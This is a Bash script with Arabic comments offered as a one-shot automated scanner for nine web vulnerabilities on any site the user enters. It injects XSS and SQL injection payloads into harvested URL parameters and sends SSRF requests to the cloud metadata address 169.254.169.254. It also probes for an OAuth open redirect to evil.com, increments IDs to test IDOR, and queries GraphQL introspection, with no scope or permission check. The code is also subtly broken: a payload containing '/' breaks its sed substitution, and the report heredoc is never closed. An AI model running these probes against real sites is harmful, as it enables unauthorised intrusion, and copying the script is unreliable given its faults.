#!/bin/bash
# =========================================================
# سكربت واحد متكامل - يفحص 9 ثغرات آلياً على أي موقع
# =========================================================

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}╔════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║   فحص الثغرات التسع - آلي بالكامل        ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════╝${NC}"

read -p "أدخل الهدف (مثال: testphp.vulnweb.com): " TARGET
if [ -z "$TARGET" ]; then echo -e "${RED}الهدف مطلوب${NC}"; exit 1; fi

DATE=$(date +%Y%m%d_%H%M%S)
OUT="scan_${TARGET}_${DATE}"
mkdir -p "$OUT"
REPORT="$OUT/report.txt"
HTML="$OUT/report.html"

echo "[+] بدء الفحص الآلي على $TARGET" | tee "$REPORT"
echo "-----------------------------------" >> "$REPORT"

# ========== 1. جمع الروابط والبارامترات آلياً ==========
echo -e "${YELLOW}[1] جمع الروابط والبارامترات...${NC}"
LINKS_FILE="$OUT/links.txt"
if command -v waybackurls &> /dev/null; then
    waybackurls "$TARGET" | grep "=" | sort -u > "$LINKS_FILE"
else
    curl -s "http://$TARGET" | grep -oP '(?<=href=")[^"]*' | grep "=" > "$LINKS_FILE"
fi
TOTAL=$(wc -l < "$LINKS_FILE")
echo "  تم العثور على $TOTAL رابط ببارامترات" | tee -a "$REPORT"

# ========== 2. اختبار XSS آلي ==========
echo -e "${YELLOW}[2] فحص XSS...${NC}"
XSS_RES="$OUT/xss.txt"
> "$XSS_RES"
PAYLOAD="<script>alert(1)</script>"
while IFS= read -r url; do
    test_url=$(echo "$url" | sed "s/=[^&]*/=$PAYLOAD/")
    if curl -s "$test_url" | grep -q "$PAYLOAD"; then
        echo "[!] XSS محتمل: $test_url" | tee -a "$XSS_RES"
    fi
done < "$LINKS_FILE"

# ========== 3. اختبار SQLi آلي (بسيط) ==========
echo -e "${YELLOW}[3] فحص SQLi...${NC}"
SQLI_RES="$OUT/sqli.txt"
> "$SQLI_RES"
SQL_PAYLOAD="1' OR '1'='1"
while IFS= read -r url; do
    test_url=$(echo "$url" | sed "s/=[^&]*/=$SQL_PAYLOAD/")
    if curl -s "$test_url" | grep -qi "sql\|mysql\|error\|syntax"; then
        echo "[!] SQLi محتمل: $test_url" | tee -a "$SQLI_RES"
    fi
done < "$LINKS_FILE"

# ========== 4. اختبار IDOR (رقمي) ==========
echo -e "${YELLOW}[4] فحص IDOR...${NC}"
IDOR_RES="$OUT/idor.txt"
> "$IDOR_RES"
grep -oE '(id|user|profile|page|order|message)=[0-9]+' "$LINKS_FILE" | sort -u | while read param; do
    id=$(echo "$param" | cut -d= -f2)
    new_id=$((id + 1))
    new_param=$(echo "$param" | sed "s/$id/$new_id/")
    original_url=$(grep -F "$param" "$LINKS_FILE" | head -1)
    test_url=$(echo "$original_url" | sed "s/$param/$new_param/")
    orig_body=$(curl -s "$original_url" 2>/dev/null)
    test_body=$(curl -s "$test_url" 2>/dev/null)
    if [ "$orig_body" != "$test_body" ]; then
        echo "[!] IDOR محتمل: تغيير $param إلى $new_param" | tee -a "$IDOR_RES"
    fi
done

# ========== 5. اختبار SSRF ==========
echo -e "${YELLOW}[5] فحص SSRF...${NC}"
SSRF_RES="$OUT/ssrf.txt"
> "$SSRF_RES"
SSRF_PAYLOAD="http://169.254.169.254/latest/meta-data/"
grep -E '(url=|redirect=|callback=|dest=)' "$LINKS_FILE" | while read url; do
    test_url=$(echo "$url" | sed "s#=[^&]*#=$SSRF_PAYLOAD#")
    code=$(curl -s -o /dev/null -w "%{http_code}" "$test_url" 2>/dev/null)
    if [ "$code" = "200" ]; then
        echo "[!] SSRF محتمل: $test_url" | tee -a "$SSRF_RES"
    fi
done

# ========== 6. GraphQL Introspection ==========
echo -e "${YELLOW}[6] فحص GraphQL...${NC}"
GQL_RES="$OUT/graphql.txt"
> "$GQL_RES"
QUERY='{"query":"{__schema{types{name}}}"}'
for endpoint in "/graphql" "/api/graphql" "/v1/graphql"; do
    url="http://$TARGET$endpoint"
    resp=$(curl -s -X POST -H "Content-Type: application/json" -d "$QUERY" "$url" 2>/dev/null)
    if echo "$resp" | grep -q "__schema"; then
        echo "[!] GraphQL Introspection مكشوف: $url" | tee -a "$GQL_RES"
    fi
done

# ========== 7. OAuth Open Redirect ==========
echo -e "${YELLOW}[7] فحص OAuth Redirect...${NC}"
OAUTH_RES="$OUT/oauth.txt"
> "$OAUTH_RES"
REDIR_URL="http://$TARGET/oauth/callback?redirect_uri=https://evil.com"
LOC=$(curl -sI "$REDIR_URL" 2>/dev/null | grep -i "Location:" | awk '{print $2}')
if echo "$LOC" | grep -q "evil.com"; then
    echo "[!] Open Redirect محتمل: $REDIR_URL" | tee -a "$OAUTH_RES"
fi

# ========== 8. Clickjacking ==========
echo -e "${YELLOW}[8] فحص Clickjacking...${NC}"
CLICK_RES="$OUT/clickjacking.txt"
> "$CLICK_RES"
HEADERS=$(curl -sI "http://$TARGET" 2>/dev/null)
if ! echo "$HEADERS" | grep -qi "X-Frame-Options"; then
    if ! echo "$HEADERS" | grep -qi "frame-ancestors"; then
        echo "[!] Clickjacking محتمل - لا توجد حماية" | tee -a "$CLICK_RES"
    fi
fi

# ========== 9. CSRF (غياب التوكن) ==========
echo -e "${YELLOW}[9] فحص CSRF...${NC}"
CSRF_RES="$OUT/csrf.txt"
> "$CSRF_RES"
if curl -s "http://$TARGET" | grep -qi "<form"; then
    if ! curl -s "http://$TARGET" | grep -qi "csrf_token"; then
        echo "[!] CSRF محتمل - لا يوجد توكن واضح" | tee -a "$CSRF_RES"
    fi
fi

# ========== 10. تقرير HTML ==========
cat > "$HTML" << EOF
<html><head><meta charset="UTF-8"><title>تقرير $TARGET</title>
<style>body{font-family:sans-serif} .vuln{color:red}</style>
</head><body>
<h1>تقرير الثغرات الآلي: $TARGET</h1>
<p>التاريخ: $(date)</p>
<h2>ملخص الثغرات المكتشفة</h2>
<pre>$(cat "$REPORT" ; echo "\n--- XSS ---" ; cat "$XSS_RES" ; echo "\n--- SQLi ---" ; cat "$SQLI_RES" ; echo "\n--- IDOR ---" ; cat "$IDOR_RES" ; echo "\n--- SSRF ---" ; cat "$SSRF_RES" ; echo "\n--- GraphQL ---" ; cat "$GQL_RES" ; echo "\n--- OAuth ---" ; cat "$OAUTH_RES" ; echo "\n--- Clickjacking ---" ; cat "$CLICK_RES" ; echo "\n--- CSRF ---" ; cat "$CSRF_RES")</pre>
</body></html>
